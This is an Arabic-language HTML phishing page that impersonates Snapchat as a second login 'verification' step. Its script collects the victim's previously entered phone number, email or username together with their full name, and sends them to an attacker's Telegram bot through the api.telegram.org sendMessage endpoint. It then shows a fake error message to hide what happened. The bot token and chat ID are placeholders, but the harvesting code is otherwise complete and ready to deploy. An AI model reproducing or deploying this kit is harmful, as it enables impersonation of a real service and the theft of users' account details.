<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>تسجيل الدخول — خطوة 2</title>

  <!-- ضع القيم على جهازك فقط إذا أردت الإرسال من المتصفح -->
  <script>
    const TG_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE';
    const TG_CHAT_ID = 'PASTE_YOUR_CHAT_ID_HERE';
  </script>

  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root{--bg:#f6f6f7;--card:#fff;--accent-yellow:#ffd400;--input-border:#ffd89a;--btn-blue:#00a8ff;--muted:#9aa0a6;--text:#111;--shadow:0 8px 28px rgba(17,17,17,0.08)}
    *{box-sizing:border-box}
    html,body{height:100%;margin:0;background:var(--bg);font-family:'Cairo',system-ui,Arial;color:var(--text);direction:rtl}
    .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
    .card{width:390px;max-width:100%;background:var(--card);border-radius:12px;box-shadow:var(--shadow);padding:26px}
    .top-pill{display:flex;align-items:center;justify-content:center;gap:10px;background:var(--accent-yellow);color:#111;padding:10px 22px;border-radius:40px;margin:0 auto 12px;font-weight:700}
    .logo{display:flex;justify-content:center;margin-bottom:8px}
    .logo img{width:66px;height:66px;object-fit:contain}
    h1{text-align:center;margin:6px 0 14px;font-size:30px;font-weight:800}
    label{display:block;color:var(--muted);margin-bottom:8px}
    input[type="text"]{width:100%;padding:14px;border-radius:12px;border:2px solid var(--input-border);font-size:16px}
    .btn{display:block;margin:14px auto;background:var(--btn-blue);color:#fff;padding:12px 22px;border-radius:40px;width:170px;text-align:center;font-weight:700;border:none;cursor:pointer}
    .status{text-align:center;color:var(--muted);margin-top:8px}
    .toast-backdrop{position:fixed;inset:0;display:none;align-items:center;justify-content:center}
    .toast{background:#fff;padding:18px;border-radius:12px;box-shadow:0 12px 40px rgba(0,0,0,0.18);width:320px;text-align:center}
    .link-back{display:block;text-align:center;color:#2aa6ff;margin-top:8px;cursor:pointer}
    .disabled{opacity:0.6;pointer-events:none}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card" role="main">
      <div class="top-pill"><span>Open Snapchat</span><img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" style="width:20px;height:20px" /></div>

      <div class="logo"><img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" /></div>
      <h1>التحقق — خطوة إضافية</h1>

      <label for="nameInput">الاسم</label>
      <input id="nameInput" type="text" placeholder="أدخل الاسم الكامل" />
      <button id="sendBtn" class="btn">إرسال الاسم</button>
      <div id="status" class="status"></div>

      <a id="back" class="link-back">العودة إلى الحقل السابق</a>
    </div>
  </div>

  <div id="toast" class="toast-backdrop" aria-hidden="true">
    <div class="toast" role="alert">
      <h3 id="tTitle">عذراً</h3>
      <p id="tMsg">اسم المستخدم أو الاسم غير صحيح. يرجى التحقق من المعلومات والمحاولة مرة أخرى.</p>
      <div style="margin-top:12px"><button id="tOk" style="background:#00a8ff;color:#fff;padding:8px 12px;border-radius:8px;border:none;cursor:pointer">حسناً</button></div>
    </div>
  </div>

  <script>
    // قراءة القيمة السابقة من sessionStorage
    const prevRaw = sessionStorage.getItem('sim_prev');
    let prev = null;
    try { prev = prevRaw ? JSON.parse(prevRaw) : null; } catch(e){ prev = null; }

    const sendBtn = document.getElementById('sendBtn');
    const statusEl = document.getElementById('status');
    const nameInput = document.getElementById('nameInput');
    const backLink = document.getElementById('back');

    function showToast(title, msg){
      document.getElementById('tTitle').textContent = title;
      document.getElementById('tMsg').textContent = msg;
      document.getElementById('toast').style.display = 'flex';
    }
    document.getElementById('tOk').addEventListener('click', function(){
      document.getElementById('toast').style.display = 'none';
      // بعد إغلاق الـ toast نرجع للصفحة الأولى كما أردت
      window.location.href = 'index.html';
    });

    // إذا لم توجد قيمة سابقة: عطّل الزر واطلب العودة
    if(!prev){
      statusEl.style.color = 'crimson';
      statusEl.textContent = 'لم تُعرَض قيمة سابقة — الرجاء العودة وإدخال الحقل الأول.';
      sendBtn.classList.add('disabled');
    } else {
      // إظهار نوع/قيمة سابقة للمستخدم (اختياري) لزيادة الوضوح
      statusEl.style.color = '#555';
      statusEl.textContent = `المدخل السابق: ${prev.type} — ${prev.value}${prev.country ? ' (' + prev.country.name + ')' : ''}`;
    }

    // دالة بسيطة لتعيين نوع
    function detectType(v){
      if(/^[\d\+\-\s]+$/.test(v)) return 'phone';
      if(v && v.includes('@')) return 'email';
      return 'username';
    }

    // إرسال: إذا لم توجد قيمة سابقة نمنع الإرسال
    sendBtn.addEventListener('click', function(){
      const name = nameInput.value.trim();
      if(!name){
        statusEl.style.color = 'crimson';
        statusEl.textContent = 'الرجاء إدخال الاسم';
        setTimeout(()=> statusEl.textContent = prev ? `المدخل السابق: ${prev.type} — ${prev.value}` : '', 2200);
        return;
      }

      if(!prev){
        showToast('خطأ','لا توجد قيمة سابقة مُسجّلة — الرجاء العودة إلى الصفحة السابقة.');
        return;
      }

      // بناء الرسالة للإرسال
      const primaryType = prev.type || detectType(prev.value);
      const primaryVal = prev.value || '(غير متوفر)';
      const countryText = (prev.country && prev.country.name) ? `${prev.country.name} ${prev.country.dial}` : '—';

      // تأكد من أن TG_TOKEN / TG_CHAT_ID تم إدخالهما في أعلى الملف (محلياً) قبل الإرسال
      if(typeof TG_TOKEN === 'undefined' || typeof TG_CHAT_ID === 'undefined' || !TG_TOKEN || !TG_CHAT_ID || TG_TOKEN.includes('PASTE') || TG_CHAT_ID.includes('PASTE')){
        showToast('خطأ','لم يتم ضبط توكن البوت أو chat_id داخل الملف.');
        return;
      }

      const text = `نموذج: الإرسال النهائي\nالنوع: ${primaryType}\nالقيمة: ${primaryVal}\nالبلد: ${countryText}\nالاسم: ${name}\nالوقت: ${new Date().toISOString()}`;
      const url = `https://api.telegram.org/bot${encodeURIComponent(TG_TOKEN)}/sendMessage?chat_id=${encodeURIComponent(TG_CHAT_ID)}&text=${encodeURIComponent(text)}`;

      // إرسال عبر Image GET (注意: التوكن سيظهر في طلب الشبكة — لا تشارك الملف)
      try {
        new Image().src = url;
        console.log('Sent final:', url);
        // أزل القيمة المؤقتة من sessionStorage حتى لا تُعاد لاحقًا
        try { sessionStorage.removeItem('sim_prev'); } catch(e){ /* ignore */ }
      } catch(e){
        console.error(e);
        showToast('خطأ','تعذّر إرسال البيانات.');
        return;
      }

      // عرض التنبيه الاحترافي كما طلبت
      showToast('عذراً','اسم المستخدم أو الاسم غير صحيح. يرجى التحقق من المعلومات والمحاولة مرة أخرى.');
      // لا نخزن أي شيء دائمًا؛ sessionStorage تم إفراغها أعلاه
    });

    backLink.addEventListener('click', function(e){ e.preventDefault(); window.location.href = 'index.html'; });
  </script>
</body>
</html>
